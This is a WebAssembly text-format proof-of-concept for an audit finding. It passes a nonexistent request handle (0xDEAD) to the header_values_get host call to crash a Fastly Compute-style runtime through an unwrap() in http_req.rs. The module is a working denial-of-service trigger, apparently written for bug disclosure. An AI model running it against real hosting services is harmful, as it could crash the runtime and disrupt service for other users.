;; PoC for finding 015: get_header_values panics on invalid request handle
;;
;; In src/component/compute/http_req.rs:241, get_header_values calls
;; request_parts(h).unwrap() while neighboring functions use ?. An invalid
;; or closed request handle causes a host panic.
;;
;; This PoC creates a request, closes it (implicitly by sending downstream
;; response), then tries to read headers from the stale handle. Since we
;; can't easily close a request handle in the wiggle ABI, we use a handle
;; that was never created.
;;
;; Trigger: serve this module and send any HTTP request.
;; Expected: host panic (or trap) from the unwrap on the invalid handle.

(module
  (import "fastly_http_req" "header_values_get"
    (func $req_header_values_get
      (param i32 i32 i32 i32 i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1)

  ;; Header name "host" at offset 0
  (data (i32.const 0) "host")

  (func (export "_start")
    ;; Try to get header values from a request handle that doesn't exist
    (call $req_header_values_get
      (i32.const 0xDEAD)  ;; invalid request handle
      (i32.const 0)       ;; name pointer ("host")
      (i32.const 4)       ;; name length
      (i32.const 100)     ;; output buffer
      (i32.const 1024)    ;; output buffer max len
      (i32.const 0)       ;; cursor
      (i32.const 200)     ;; ending_cursor_out
      (i32.const 300)     ;; nwritten_out
    )
    drop
  )
)
